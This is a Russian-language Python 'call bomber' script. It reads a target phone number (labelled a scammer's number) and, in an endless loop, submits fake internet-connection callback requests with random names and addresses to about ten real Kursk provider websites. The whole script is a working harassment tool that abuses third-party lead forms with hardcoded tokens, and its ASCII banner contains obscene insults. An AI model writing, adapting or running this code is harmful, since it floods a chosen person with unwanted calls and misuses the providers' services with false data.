import requests
import time
import random
import os
import colorama
from colorama import init, Fore, Back
init()

os.system('clear')

n0 = ('Евгений', 'Елена', 'Екатерина', 'Наталья', 'Светлана' 'Олег' 'Егор', 'Дмитрий')
nnf0 = ('Евгений Петрович', 'Евгений Алексеевич', 'Александра Эдуардовна', 'Наталья Андреевна', 'Дмитрий Олегович')
nf0 = ('Евгений Дорошев', 'Евгений Оловянников', 'Полина Дубкова', 'Дмитрий Собакин')
nff0 = ('Дорошев Евгений Петрович', 'Лисицына Елена Григорьевна', 'Печев Александр Романович', 'Собакин Дмитрий Алексеевич')
d0 = ('1', '1А', '2', '3')
st0 = ('Народная', 'Серегина', 'Гагарина')
kv0 = ('13', '12', '14', '15', '9', '26')
ckb0 = ('Видеонаблюдение', 'Интернет', 'Телевидение')

ph = ('oYWtPLP', 'EUCVP', 'CnLF')

n = random.choice(n0)
nnf = random.choice(nnf0)
nf = random.choice(nf0)
nff = random.choice(nff0)
d = random.choice(d0)
st = random.choice(st0)
kv = random.choice(kv0)
ckb = random.choice(ckb0)
city = ('Курск')

hello = """
   \|!         Б0мб3р Сп3циальн0г0 Назнач3ния                     
    !|\                      Имени Авроры                      
     \|!                                 04.2023        v-1.0      
      !|\   by Клуб НеЛюбителей Фикусов                              """
banner = """
 ____________________________________________________
|MTS,ROSTELECOM,DOM.RU,MTS,ROSTELECOM,DOM.RU,MTS,ROST|             +7                                           
|ELECOM, СВОЛОЧЬ S,ROSTELECOM,DOM.RU,MTS,ROSTELECOM,D|         .   (9                                 
|MTS,ROSTELECOM,DOM.RU,MTS,RO ПИДР OM,DOM.RU,MTS,ROST|         0123456789
|ELECOM, ПАСКУДА S,R блядота ,DOM.RU,MTS,ROSTELECOM,D|         0123456789)
|MTS,ROSTELECOM,DOM. AURORA OSTELECOM,DOM.RU,M И ROST|            |    |
|ELECOM,DOM.RU,MTS,ROSTELECOM,DOM.RU,MTS,ROSTE Ш OM,D|         0123456789
|MTS,ROSTE?                              .RU,M А ROST|         0123456789
|ELECOM,DO!         для химички          'OSTE К OM,D|         0123456789
|MTS,ROSTE                               .RU,MTS,ROST|           | -|
|ELECOM,DOM.RU,MTS,ROSTELECOM,DOM.RU,MTS,ROSTELECOM,D|         0123456789
|MTS, ТВАРЪ COM,DOM.RU,MTS,ROSTELECOM,DOM.RU,MTS,ROST|         0123456789
|ELECOM,DOM.RU,MTS,ROSTELECOM,DOM.RU,MTS,ROSTELECOM,D|             -  |
|MTS,ROSTELECOM,DOM.RU,MTS,ROSTELECOM,DOM.RU,MTS,ROST|         0123456789  
|____________________________________________________|         0123456789
                                                                    '"""
print(Fore.LIGHTYELLOW_EX + hello)
print(Fore.LIGHTGREEN_EX + banner)
print(Fore.LIGHTRED_EX + random.choice(ph))

try:
    phn = input(Fore.RESET + "Номер афериста: + ")
    p0 = phn[0]
    p1 = phn[1]
    p2 = phn[2]
    p3 = phn[3]
    p4 = phn[4]
    p5 = phn[5]
    p6 = phn[6]
    p7 = phn[7]
    p8 = phn[8]
    p9 = phn[9]
    p10 = phn[10]
    phn0 = phn[1:10]
    phn1 = f'+{p0} ({p1}{p2}{p3}) {p4}{p5}{p6} {p7}{p8}{p9}{p10}'
    phn2 = f'+{p0}({p1}{p2}{p3})-{p4}{p5}{p6}-{p7}{p8}-{p9}{p10}'
    phn3 = f'+({p1}{p2}{p3}) {p4}{p5}{p6}-{p7}{p8}-{p9}{p10}'
    phn4 = f'+{p0} ({p1}{p2}{p3}) {p4}{p5}{p6}-{p7}{p8}-{p9}{p10}'
    phn5 = f'8 ({p1}{p2}{p3}) {p4}{p5}{p6}-{p7}{p8}-{p9}{p10}'
    phn6 = f'+{p0}({p1}{p2}{p3}){p4}{p5}{p6}-{p7}{p8}-{p9}{p10}'
    print('')

    while True:
        try:
            r = requests.post('https://kursk.mtsru.ru/connect', data={'submitted': '10264',
                                                                              'isPopup10264': '0',
                                                                              'fields[10270]': '0',
                                                                              'fields[10265]': phn1,
                                                                              'fields[10266]': nff,
                                                                              'fields[10267]': city,
                                                                              'fields[10268]': st,
                                                                              'fields[10269]': d,
                                                                              'fields[10271]': kv,
                                                                              'fields[0]': '3b6ace0e58546ed19bdb2d629f1d38593',
                                                                              'fields[1': None}, headers={})
            print(Fore.CYAN + """https://kursk.mtsru.ru
            Заявка отправлена...""")
            if r.status_code == 200:
                print(Fore.GREEN + """Успешно, ~15 минут
                                """)
            elif r.status_code == 400:
                print(Fore.RED + """Безуспешно
                            """)
            else:
                print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                             """)
            time.sleep(2)
        except:
            print(Fore.RED + """Сервис не отвечает
                        """)
        try:
            r = requests.post('https://kursk.domconnect.ru/ajax/activeform?sendedsourceid=106', data={'sendedsourceid': '106',
                                                                                                      'formname': 'call-me-consult',
                                                                                                      'sendedphone': phn4}, headers={})
            print(Fore.CYAN + """https://https://kursk.domconnect.ru
            Заявка отправлена...""")
            if r.status_code == 200:
                print(Fore.GREEN + """Успешно, ~2 минуты
                                        """)
            elif r.status_code == 400:
                print(Fore.RED + """Безуспешно
                                    """)
            else:
                print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                     """)
            time.sleep(2)
        except:
            print(Fore.RED + """Сервис не отвечает
                                """)
            time.sleep(2)
        try:
            r = requests.post('https://kursk-rt.ru/wp-admin/admin-ajax.php', data={'action': 'send_form_this_modal',
                                                                                   'resurs[name]': nff,
                                                                                   'resurs[phone]': f'{p0} ({p1}{p2}{p3}) {p4}{p5}{p6} {p7}{p8} {p9}{p10}',
                                                                                   'resurs[street]': st,
                                                                                   'resurs[home]': d,
                                                                                   'resurs[kvart]': kv}, headers={})
            print(Fore.CYAN + """https://kursk-rt.ru
            Заявка отправлена...""")
            if r.status_code == 200:
                print(Fore.GREEN + """Успешно, ~30 минут
                                    """)
            elif r.status_code == 400:
                print(Fore.RED + """Безуспешно
                                """)
            else:
                print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                 """)
            time.sleep(2)
        except:
            print(Fore.RED + """Сервис не отвечает
                            """)
        time.sleep(2)
        try:
            r = requests.post('https://kursk.telekom-internet.ru/wp-admin/admin-ajax.php', data={'art_name': nf,
                                                                                                 'art_tel': phn,
                                                                                                 'art_street': st,
                                                                                                 'art_home': d,
                                                                                                 'art_kv': kv,
                                                                                                 'art_url': 'https://kursk.telekom-internet.ru/internet-v-kvartiru',
                                                                                                 'art_anticheck': 'true',
                                                                                                 'art_submitted': None,
                                                                                                 'action': 'feedback_action',
                                                                                                 'nonce': 'f884acba78'}, headers={})
            print(Fore.CYAN + """https://kursk.telekom-internet.ru
            Заявка отправлена...""")
            if r.status_code == 200:
                print(Fore.GREEN + """Успешно, ~15 минут
                                        """)
            elif r.status_code == 400:
                print(Fore.RED + """Безуспешно
                                    """)
            else:
                print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                     """)
            time.sleep(2)
        except:
            print(Fore.RED + """Сервис не отвечает
                                """)
            time.sleep(2)
        try:
            r = requests.post('https://kursk.tvoi-provider.ru/actions/formResponse.php', data={'f50name': nf,
                                                                                               'f50phone': phn6,
                                                                                               'formCode': 'callConnect',
                                                                                               'formName': 'Подключиться к оператору'}, headers={})
            print(Fore.CYAN + """https://kursk.tvoi-provider.ru:
            Заявка отправлена...""")
            if r.status_code == 200:
                print(Fore.GREEN + """Успешно, ~15 минут
                                        """)
            elif r.status_code == 400:
                print(Fore.RED + """Безуспешно
                                    """)
            else:
                print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                     """)
            time.sleep(2)
        except:
            print(Fore.RED + """Сервис не отвечает
                                """)
            time.sleep(2)
        try:
            r = requests.post('https://internet.gde-luchshe.ru/api/v1/calls/new/', data={'call[phone]': phn4,
                                                                                         'provider_alias': 'ertelecom'}, headers={})
            print(Fore.CYAN + """https://internet.gde-luchshe.ru:
            Заявка отправлена...""")
            if r.status_code == 200:
                print(Fore.GREEN + """Успешно, ~10 минут
                                    """)
            elif r.status_code == 400:
                print(Fore.RED + """Безуспешно
                                """)
            else:
                print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                 """)
            time.sleep(2)
        except:
            print(Fore.RED + """Сервис не отвечает
                            """)
            time.sleep(2)
        try:
            r = requests.post('https://domru-pro.ru/api/create_order', data={'call_later': 'now',
                                                                         'call_later_time': None,
                                                                         'from_site': 'domru-pro.ru',
                                                                         'name': n,
                                                                         'phone': phn,
                                                                         'provider_id': '8',
                                                                         'slug': 'kursk',
                                                                         type: 'apartments'}, headers={})
            print(Fore.CYAN + """https://domru-pro.ru
            Заявка отправлена...""")
            if r.status_code == 200:
                print(Fore.GREEN + """Успешно, ~15 минут
                                        """)
            elif r.status_code == 400:
                print(Fore.RED + """Безуспешно
                                    """)
            else:
                print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                     """)
            time.sleep(2)
        except:
            print(Fore.RED + """Сервис не отвечает
                                """)
            time.sleep(2)
        try:
            r = requests.post('https://kursk.internetv-dom.ru/connect', data={'submitted': '16792',
                                                                              'isPopup16792': '0',
                                                                              'fields[16794]': '0',
                                                                              'fields[16795]': phn1,
                                                                              'fields[16796]': nff,
                                                                              'fields[16797]': city,
                                                                              'fields[16798]': st,
                                                                              'fields[16799]': d,
                                                                              'fields[16800]': kv,
                                                                              'fields[16802]': '1',
                                                                              'fields[16804]': None,
                                                                              'fields[0]': '833f7326312f8e31d13de9b8905a7b283',
                                                                              'fields[1': None}, headers={})
            print(Fore.CYAN + """https://kursk.internetv-dom.ru
            Заявка отправлена...""")
            if r.status_code == 200:
                print(Fore.GREEN + """Успешно, ~15 минут
                                        """)
            elif r.status_code == 400:
                print(Fore.RED + """Безуспешно
                                    """)
            else:
                print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                     """)
            time.sleep(2)
        except:
            print(Fore.RED + """Сервис не отвечает
                                """)
            time.sleep(2)
        try:
            r = requests.post('https://xn--d1aqf.ru.com/wp-json/contact-form-7/v1/contact-forms/32/feedback', data={'_wpcf7': '32',
                                                                                                                    '_wpcf7_version': '5.2.1',
                                                                                                                    '_wpcf7_locale': 'ru_RU',
                                                                                                                    '_wpcf7_unit_tag': 'wpcf7-f32-o1',
                                                                                                                    '_wpcf7_container_post': '0',
                                                                                                                    '_wpcf7_posted_data_hash': None,
                                                                                                                    'text-650': nff,
                                                                                                                    'tel-239': phn,
                                                                                                                    'text-651': city,
                                                                                                                    'text-652': st,
                                                                                                                    'text-653': d,
                                                                                                                    'text-654': None,
                                                                                                                    'сheckbox-251[]': ckb,
                                                                                                                    'utm_source': None,
                                                                                                                    'utm_campaign': 'null',
                                                                                                                    'utm_term': 'null',
                                                                                                                    'pum_form_popup_id': '33'}, headers={})
            print(Fore.CYAN + """https://dom.ru.com/kursk/
            Запрос отправлен...""")
            if r.status_code == 200:
                print(Fore.GREEN + """Успешно, ~15 минут
                                        """)
            elif r.status_code == 400:
                print(Fore.RED + """Безуспешно
                                    """)
            else:
                print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                     """)
            time.sleep(2)
        except:
            print(Fore.RED + """Сервис не отвечает
                                """)
            time.sleep(2)
        try:
            r = requests.post('https://forms.tildacdn.com/procces/', data={'formservices[]': '9a7583bc193844d71a85e8533523eb83',
                                                                           'formservices[]': 'e37532ffacd80e7c8323473047845c15',
                                                                           'tildaspec-formname': 'zayavka1screen',
                                                                           'usluga': 'Интернет+ТВ',
                                                                           'tildaspec-phone-part[]-iso': '+7',
                                                                           'tildaspec-phone-part[]': phn3,
                                                                           'phone': phn4,
                                                                           'adres': 'г Москва',
                                                                           'form-spec-comments': '_ga=GA1.2.481003255.1680794607; _ym_uid=1680794607982802238; _ym_d=1680794607; _gid=GA1.2.1171597313.1680946522; _gat=1; _ym_isad=2',
                                                                           'tildaspec-referer': 'https://tarify-dom.ru/kursk',
                                                                           'tildaspec-formid': 'form235754624',
                                                                           'tildaspec-': '93d84e0c2ba5f1ea33c120ac9d32a',
                                                                           'formskey': '27a',
                                                                           'tildaspec-version-lib': '02.001',
                                                                           'tildaspec-pageid': '14282519',
                                                                           'tildaspec-projectid': '3060395',
                                                                           'tildaspec-lang': 'RU',
                                                                           'tildaspec-fp': 'st445w836h790ft219.171875445'}, headers={})
            print(Fore.CYAN + """https://tarify-dom.ru
            Запрос отправлен...""")
            if r.status_code == 200:
                print(Fore.GREEN + """Успешно, ~15 минут
                                        """)
            elif r.status_code == 400:
                print(Fore.RED + """Безуспешно
                                    """)
            else:
                print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                     """)
            time.sleep(2)
        except:
            print(Fore.RED + """Сервис не отвечает
                                """)
            time.sleep(2)
except:
    print(Fore.RED + 'Неправильно набран номер')
